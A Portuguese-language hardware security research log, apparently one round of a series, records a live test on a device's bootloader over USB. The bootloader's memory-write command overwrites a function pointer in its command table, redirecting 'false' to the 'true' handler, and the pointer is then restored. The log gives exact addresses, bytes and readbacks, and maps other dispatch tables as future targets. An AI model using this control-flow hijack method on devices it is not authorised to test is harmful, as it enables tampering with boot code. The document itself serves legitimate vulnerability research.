# BL33 cmd redirect round 42: WRITE 8B -> function pointer -> handler legitimo

date: 2026-10-01. live, no aparelho. BL33 em RAM, `1b8e:c003`, stage 16.
base: round39 (WRITE_MEM 0x01), round40 (consumo duplo), round41 (mapa cmd_tbl).
nenhum RUN_IN_ADDR, shellcode, instrucao, page table, BL31, flash/eMMC tocado.

## 0. resposta

```text
A=false idx43 entry 0x37f616c0 slot 0x37f616d0 orig 0x37e36764
B=true  idx101 entry 0x37f621a0 slot 0x37f621b0 handler 0x37e3676c
WRITE 8B 0x37f616d0 <- 6c 67 e3 37 00 00 00 00, readback 0x02 e mread ok
trigger false: antes b'failed:' depois b'success' (=handler true)
restore 8B orig, readback duplo ok, false volta a b'failed:', sessao stage 16 viva
mmc/store/env dispatchers: mesma forma ldr x4,[x?,#0x10]+blr x4, sub-tabelas live==offline
```

## 1. read-only antes

```text
false idx43 0x37f616c0: nameptr 0x37ec7389(b'false') max64 rep1 handler 0x37e36764 uso 0x37ec738f
true idx101 0x37f621a0: nameptr 0x37edc333(b'true') max64 rep1 handler 0x37e3676c uso 0x37ec7370
echo idx34 handler 0x37e28000, version idx110 handler 0x37e26688, todos em 0x37e18000..0x37ff0000
dispatcher 0x37e5f6e8 live == offline (f9 40 0a 64 = ldr x4,[x19,#0x10])
handler code live==offline, name/usage strings live==offline
mread(0x34+0x33) == 0x02 para as duas entradas
baseline mesma sessao: false->b'failed:', true->b'success', echo/version/help->b'success'
```

par escolhido: A=false, B=true. motivo: maxargs/rep identicos (64/1),
handlers adjacentes de 1 instrucao (mov w0,#1 vs mov w0,#0 + ret),
delta de 1 byte (0x64->0x6c), discriminador binario no bulk reply head,
sem storage/hardware. version/echo descartados como B porque reply head
e `success` igual ao true, sem discriminacao.

## 2. teste

log: /tmp/opencode/redirect_result.txt (sessao unica, um processo).

```text
BEFORE slot 0x37f616d0 = 64 67 e3 37 00 00 00 00, full entry match offline
WRITE 0x01 0x37f616d0 <- 6c 67 e3 37 00 00 00 00 (8B, uma transferencia)
MID 0x02 = 6c 67 e3 37..., mread = 0x02, only-slot-changed True
TRIGGER bulkcmd false -> b'success' (antes b'failed:')
RESTORE <- 64 67 e3 37..., 0x02 ok, mread ok, match02 True
RE-TRIGGER false -> b'failed:' True, true -> b'success', identify stage 16
```

sem crash, sem wedge, sem power-cycle. resto da entrada intocado
(name/max/rep/usage/help/complete).

## 3. outros dispatchers, so mapa read-only

mesma forma, todos `ldr x4,[x?,#0x10]` + `blr x4`, sem mascara:

```text
mmc   0x37e2ca3c: ldr x4,[x19,#0x10] em 0x37e2cae4 + blr x4 em 0x37e2caf0, tabela 0x37ee5bc0
store 0x37e33900: ldr x4,[x0,#0x10] em 0x37e3394c + blr x4 em 0x37e3395c, tabela 0x37ee62f0
env   0x37e57d6c: ldr x4,[x0,#0x10] em 0x37e57db4 + blr x4 em 0x37e57dc8, tabela 0x37ee70f8
vpu/fastboot glue 0x37e3a8cc: ldr x4,[x0,#0x10] + blr x4 (sub-tabela mesmo molde)
sub-tabelas live==offline nas 2 primeiras entradas de cada (info/read, init/exit, default/delete)
dispatchers live==offline 16B; handlers 116/116 em BL33 ja provado round41
usb/fastboot state 0x37f62550 / 0x37f62638 e bss 0x37f60cc0: lidos, BSS varia por sessao, sem escrita
```

NAO TESTADO: qualquer WRITE nessas sub-tabelas. so leitura nesta rodada.

## 4. veredito

1. cmd_tbl[i].cmd controla fluxo no BL33? CONFIRMADO, observado no aparelho.
2. WRITE_MEM altera function pointer 64 bits? CONFIRMADO, 8B + readback duplo.
3. comando redirecionado para outro handler legitimo? CONFIRMADO, false->true.
4. efeito observavel e reversivel? CONFIRMADO, failed:/success/failed: + restore duplo.
5. outros dispatchers equivalentes? PROVAVEL, mesma instrucao + tabelas live==offline, NAO PROVADO com WRITE.
6. proximo teste menor risco/maior valor: repetir molde false->true em sub-tabela inofensiva
   (ex. env `default`->`print`? so se handler for display-only) ou par echo->version com
   captura de output; nunca RUN, nunca flash/eMMC/efuse/boot/reset.

risco real: bulk incompleto (`upload` sem args) derruba gadget sem nenhum write;
usar so comandos completos com drain via 0x33. nada persistente deixado.
